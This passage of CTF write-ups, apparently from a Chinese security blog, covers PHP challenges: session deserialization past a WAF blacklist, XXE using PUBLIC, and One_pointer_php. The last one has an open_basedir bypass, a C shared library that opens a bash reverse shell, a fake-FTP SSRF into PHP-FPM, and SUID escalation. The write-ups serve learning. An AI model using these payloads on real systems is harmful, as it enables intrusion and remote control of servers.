    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"&lt;?php class hacker{public function hack(){echo 'hack the hack!I believe you can!';}}\$hack="</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token operator">=</span><span class="token string">"new hacker();"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token operator">=</span><span class="token string">"\$hack->hack();"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$blacklist</span><span class="token operator">=</span><span class="token string">"/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">60</span><span class="token operator">||</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/\\(/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">||</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/\\)/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/;/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token string">"try hard"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/hack.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/hack.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/hack.php"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/hack.php"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">contents</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/hack.php"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"&lt;?php class hacker{public function hack(){echo 'hack the hack!I believe you can!';}}\$hack="</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token operator">=</span><span class="token string">"\$hack->hack();"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$preload</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">preload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./hack.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>hack<span class="token punctuation">.</span>php<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./cli.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>cli<span class="token punctuation">.</span>php<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>wakeup函数控制了class和method，waf限制了字段，且content长度不能超过60，分号和括号对不能超过两个，POST数据反序列化后还会new一个preload，new出来的preload完全不可控，且析构时写入hack.php，一开始还以为是条件竞争。。。</p>
<p>但是还有一个可疑的地方，admin.php是这个样子的</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='./index.php'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\|[OC]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sign'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"your sign is: "</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"please set your sign"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./preload.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>write a hack<span class="token punctuation">.</span>php<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./upload.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>upload something<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>其设定了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</code>，而preload中没有设置，那么其使用的session序列化handler就应该是默认的php，且我们还可以控制session的内容~<br>waf还是个特别直接的<code>|O:1:</code>这种显然是序列化数据类型的过滤。真有意思</p>
<p>打一个session反序列化写文件。</p>
<p>之前已经忘了session反序列化的操作了，一开始还以为和之前那种反序列化逃逸一样要把数据构造的好看一点，没想到php作为handler的时候直接就把|后面内容作为值取出来进行反序列化，只要|后面取出来完整就行，前后还有其他的数据都不管了<br>session反序列化在session_start的时候开始，而在整个脚本处理结束后析构，所以session反序列化也不会受到之前那个new出来的preload的影响。（一开始还想着靠POST的反序列化进die来阻止后面的new preload的创建）<br>但是直接塞一个对象好像跑不通？后来乱试试出来把object塞到一个数组里面就又能跑通了，原理不明<br>塞到数组里也直接过waf了诶。。。</p>
<p>然后就是过preload的waf，这个waf真实超级拉满。。。先扫目录<code>a;echo serialize(scandir(&#39;/&#39;));</code>用序列化把数组给输出出来（还挺巧妙的）<br>flag就在根目录，但是flag这个词ban了，读文件的函数也被通杀完了。。。waf超狠，最后翻出来一个copy函数打通<code>a;copy(strrev(&#39;galf/&#39;), &#39;/var/www/html/admin/upload/a&#39;);</code><br>访问一下hack.php触发然后去upload目录拿flag</p>
<h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>一开始我居然天真的以为wakeup的绕过是通杀的，只要绕过了wakeup之后想写什么写什么。。。后来才发现对PHP高版本wakeup绕过会直接导致反序列化失败。。。完全不行<br>反序列化的数据控制的很严格，一开始我还以为session的那个<code>O:1:</code>这种过滤能直接加空格绕过。。结果完全不行嗷，但是可以用加号<code>O:+1:</code>绕过，这种东西居然能百度到，真不错</p>
<h3 id="看wp"><a href="#看wp" class="headerlink" title="看wp"></a>看wp</h3><p>我这边条件竞争是没有过那个new的preload的，看了眼vn的wp，直接条件竞争就过了，真牛逼</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>扫目录扫出来h1nt.php，访问给了db文件路径，能直接访问下载（为什么db文件会和web服务在一个目录下。。。）<br>然后直接在db文件里找到admin的账户密码，账号是admin888，密码是md5还原一下为attack<br>登进去是个后台，找到了可能用的框架叫onenav，拉下来源码感觉魔改了一些，审不出来什么东西</p>
<h3 id="看wp-1"><a href="#看wp-1" class="headerlink" title="看wp"></a>看wp</h3><p>有一个<code>class/showImage.php?file=</code>，这个好像当初也发现了但是发现web4是个xxe之后就全去打web4了。。。<br>有过滤，但是php:&#x2F;&#x2F;filter会二次解码直接绕过过滤，读到一堆源码之后按照提示审计就能RCE（但是我现在也搞不到源码审不了了呜呜）</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>xxe，过滤了SYSTEM，用utf16编码打了一遍没打通。不会了，对xxe的认识一直停留在复制粘贴payload环节</p>
<h3 id="看wp-2"><a href="#看wp-2" class="headerlink" title="看wp"></a>看wp</h3><p>能够用PUBLIC来代替SYSTEM做同样的操作，真玄幻<br>去查奇怪的文献，得到如下内容</p>
<blockquote>
<p>There are two types of external entities: private, and public. Private external entities are identified by the keyword SYSTEM, and are intended for use by a single author or group of authors. Public external entities are identified by the keyword PUBLIC and are intended for broad use.</p>
</blockquote>
<p>简单的意思就是SYSTEM声明一个私有外部实体，PUBLIC声明一个公有外部实体，不过PUBLIC在写payload之前还要多谢一个实体名称，用双引号括起来，这点算是新学的了</p>
<p>然后需要ssrf打admin.php，但是不能同时出现<code>http</code>和<code>dtd|ENTITY</code>字样，不能用ENTITY就得引用远程的dtd文件，但是dtd也不允许出现，这里说后缀是.d或者.dtd都行（暂时没找到对应的资料，不太行，本地复现的时候连导入外部实体都成问题。。。</p>
<p>后面是一个phar反序列化打一个匿名函数，有源码应该就好打了呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>session反序列化</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>[蓝帽杯]One_pointer_php</title>
    <url>/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%5DOne_pointer_php.html</url>
    <content><![CDATA[<h1 id="蓝帽杯-One-pointer-php"><a href="#蓝帽杯-One-pointer-php" class="headerlink" title="[蓝帽杯]One_pointer_php"></a>[蓝帽杯]One_pointer_php</h1><p>一个玄幻的webpwn，但是我看大家都用FPM成功bypass了，所以复现顺便记录一下</p>
<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>第一步是个反序列化，大概是这么个要求</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这样子的赋值形式会直接让其下标递增，我当时想到了整数溢出，但是我本地的环境最高只能到PHP7.2，这个版本及其之前版本下数字过大就直接把下标变成从0开始了，并打不通，远程环境是PHP7.4.1，后来网上找了个在线环境试了一下打通了<br>count等于long最大值-1即可，long最大值为<code>9223372036854775807</code>(63位二进制，留一位符号位)，大概是先++到达最大值，再++的时候整数溢出就崩了吧。PHP7.4下会报一个warning然后赋值失败，用PHP8的环境这里就直接fatal error退出了，往前的版本会无事发生大家直接从0开始。。。利用环境真苛刻<br>如果直接把下标调成long最大值，此时++又不会直接崩盘，而是直接变成负数最小值（就是63位全0然后符号位1那个值），然后if那里的赋值再++之后下标会变成0，真是诡异</p>
<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>拿到一个shell之后发现并打不通，phpinfo一看open_basedir+disable_function超级拉满</p>
<h3 id="ini-set绕过"><a href="#ini-set绕过" class="headerlink" title="ini_set绕过"></a>ini_set绕过</h3><p>open_basedir可以用经典的的ini_set+chdir绕过，先然后mkdir()创建一个子目录，然后再chdir()进去，<code>ini_set(&quot;open_basedir&quot;, &quot;..&quot;)</code>就是合法的，当open_basedir变成<code>..</code>之后，就可以一路chdir(“..”)直达根目录，这时再<code>ini_set(&quot;open_basedir&quot;, &quot;/&quot;)</code>就可以完全绕过open_basedir的限制了<br>一开始直接<code>ini_set(&quot;open_basedir&quot;, &quot;/&quot;)</code>肯定是不给过的，因为根目录不在当前的open_basedir下</p>
<pre class=" language-php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'z33'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'z33'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 想干嘛干嘛</span>
</code></pre>
<p>当然这个操作首先需要拥有当前目录写权限，或者存在一个可以cd进去的子目录</p>
<h3 id="glob协议绕过"><a href="#glob协议绕过" class="headerlink" title="glob协议绕过"></a>glob协议绕过</h3><p>另一种操作，用DirectoryIterator这个类可以查看目录下文件，配合glob协议无视open_basedir（我也不知道为什么），抄一个脚本</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// normal files</span>
<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*");</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// special files (starting with a dot(.))</span>
<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///.*");</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"{$f}&lt;br/>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p><code>glob:///*</code>列举根目录下全部文件，列举其他目录的改下目录即可</p>
<p>扫目录在<code>/etc/nginx/sites-enabled/default</code>中读到配置内容，<code>fastcgi_pass   127.0.0.1:9001;</code>，可以打一个ssrf。预期解法应该是读<code>/usr/local/etc/php/php.ini</code>读到加载了一个extension，然后把那个扩展拉下来逆打pwn吧（好像以前遇到过这个样子的题目）</p>
<h2 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h2><p>还是复现一下FPM的打法，不能老是纸上谈兵（虽然脚本还是继续抄，抄的参考链接里面的）用gopherus也能生成一个payload，不过还得想个办法进行手动发包</p>
<p>如果能用gopher自然是可以手动控制TCP包的数据，本地测试PHP自带的curl功能是可以发送gopher协议的，不知道是远程环境哪里的问题，curl一用直接500，报错也不给看，不知道是不是这个模块没加载，只能用参考链接的伪造ftp进行通信了<br>FTP一个端口控制一个端口通信，通信端口没有任何的额外数据，所以就和gopher差不多能让我们打一个完全可控的tcp数据流<br>简单的说就是FTP存在一个passive被动服务模式，客户端连上服务器，服务器返回一个ip:port，客户端就开始和那个端口进行通信，注意这里的ip:port是由服务器指定的，所以起一个恶意服务端然后返回127.0.0.1:9001，这样子用户发送的数据流就直接打到本地的FPM上完成命令执行了。<br>先把经典.so传上去</p>
<pre class=" language-C"><code class="language-C">#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");
}
</code></pre>
<p><code>gcc evil.c -fPIC -shared -o evil.so</code> 编译成动态链接库，这个经典.so应该是加载即触发，不需要额外的进行触发操作</p>
<p>用抄来的脚本搭一个伪ftp服务器，不过他端口那填了个9001好像不符合规范，应该改成35,41，按照规则应该是35*256+41&#x3D;9001这样子比较正常</p>
<p>递归学习看到了RMB122神仙的博客，他直接看PHP在ftp这边实现的源码了。我光速爬，直接填9001也是可以的，因为PHP在底层处理的时候并没有管这么多，可以说是没有按规则处理，PHP源码在注释中写道在PASV模式下是忽略ip只获取端口的，但实际上操作的时候还是获取了ip，所以我们才能拿这个打一个ssrf，并且FTP的回复也可以有两种，都可以使得PHP的FTP链接进入到PASV模式，蓝帽杯wp里有一种，RMB神仙的博客里是另一种</p>
<p>现在要让目标连接一下我们的恶意ftp服务，直接使用PHP文件协议原生支持的ftp协议，在file_put_content函数这里发起ftp请求</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'/tmp/file'</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">':)'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// echo file_get_contents($file);</span>
</code></pre>
<p>这个代码就是RMB神仙博客里的那道hxp的题，这里打开一个ftp链接，然后直接往这个连接里写东西，因为连上的是我们的恶意服务端，所以返回的写数据的位置就直接是本地的FPM，就可以设置extension_dir和extentsion两个PHP_ADMIN_VALUE加载恶意.so反弹shell了（这里踩了两个巨大的坑。。。。第一个是ftp协议端口后面还要跟一个<code>/</code>，这里一开始半天没打通，第二个是data他这里是$_GET获取的所以提交的时候url编码了，我直接往代码里写忘记解码了。。。。）</p>
<p>vps上直接起一个假ftp再监听一个端口等shell过来就行了</p>
<p>弹回来shell之后flag是root:root 700，还差一步提权，<code>find / -perm -u=s</code>就行，找到PHP自己就是setUID程序，直接改一个PHP文件再执行都行（但是还得再用前面的ini_set来bypass一下open_basedir）</p>
<h3 id="另一个解"><a href="#另一个解" class="headerlink" title="另一个解"></a>另一个解</h3><p>直接用pfsockopen这个函数起socket链接发送原始TCP数据直接打通<br>说实话我觉得这个应该是比较正常的解，PHP怎么可能不能直接发原始tcp数据，disable_function里面ban了一个fsockopen，但是漏了这个，我觉得一开始想到这个才是最正常的吧</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a><br><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">hxp CTF resonator Writeup - SSRF via file_put_contents|Rmb122’s Notebook </a>再膜一下<br><a href="https://mp.weixin.qq.com/s?__biz=MjM5Njc1OTYyNA==&mid=2450777020&idx=1&sn=f9d18ac6a1421de229dd980ec993e40f">第五届“蓝帽杯”全国大学生网络安全技能大赛初赛WriteUp</a><br><a href="https://err0r.top/article/bluehat2021/">蓝帽杯2021一道题——One_Pointer_PHP</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bypass_disable_function</tag>
        <tag>fpm</tag>
      </tags>
  </entry>
  <entry>
    <title>[钓鱼城杯]easyweb</title>
    <url>/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html</url>
    <content><![CDATA[<h1 id="钓鱼城杯-easyweb"><a href="#钓鱼城杯-easyweb" class="headerlink" title="[钓鱼城杯]easyweb"></a>[钓鱼城杯]easyweb</h1><p>命令执行，post一个cmd，无回显不能连接外网。就是学一下shell语法，然后用时间盲注获得flag</p>
